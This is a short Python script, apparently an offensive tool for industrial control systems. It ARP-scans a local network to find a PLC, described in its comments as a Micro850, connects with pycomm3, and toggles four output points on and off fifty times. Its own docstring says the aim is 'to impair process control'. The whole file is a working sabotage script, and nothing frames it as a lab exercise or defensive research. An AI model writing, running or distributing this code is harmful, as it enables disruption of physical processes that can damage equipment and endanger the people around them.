import time
import ipaddress
from pycomm3 import LogixDriver
from scapy.all import ARP, Ether, srp


def find_plc_ip(network="192.168.1.0/24"):
    """
    Scan the network for active devices and return the first active PLC IP.
    """
    print("[*] Scanning network to find PLC...")
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered, _ = srp(packet, timeout=2, verbose=False)

    for sent, received in answered:
        ip_addr = received.psrc
        
        # Test connection using pycomm3 (Micro850 usually responds or times out)
        try:
            with LogixDriver(f"{ip_addr}") as plc:
                plc.read('SYSNAME')
                print(f"[+] Found PLC at {ip_addr}")
                return ip_addr
        except:
            continue  # Skip non-PLC devices

    print("[-] No PLC found on the network.")
    return None


def brute_force_io(plc_ip):
    """
    Connects to the Micro850 PLC and repetitively toggles an output to impair process control.
    """
    print("[*] Connecting to PLC at", plc_ip)

    try:
        with LogixDriver(plc_ip) as plc:
            print("[+] Connected to PLC.")

            io_point = "O[0]"  # Example output point (Modify as needed)
            brute_force_range = ["O[0]", "O[1]", "O[2]", "O[3]"]  # Multiple points

            for _ in range(50):  # Repeat brute force 50 times
                for io in brute_force_range:
                    print(f"[*] Writing True to {io}")
                    plc.write(io, 1)  # Set Output ON
                    time.sleep(0.2)  # Short delay

                    print(f"[*] Writing False to {io}")
                    plc.write(io, 0)  # Set Output OFF
                    time.sleep(0.2)  # Short delay

            print("[+] Brute Force Attack Complete.")
    
    except Exception as e:
        print(f"[-] Error communicating with PLC: {e}")


if __name__ == "__main__":
    # Step 1: Find PLC IP in the network
    plc_ip = find_plc_ip()

    if plc_ip:
        # Step 2: Perform Brute Force I/O
        brute_force_io(plc_ip)
    else:
        print("[-] No PLC found. Exiting.")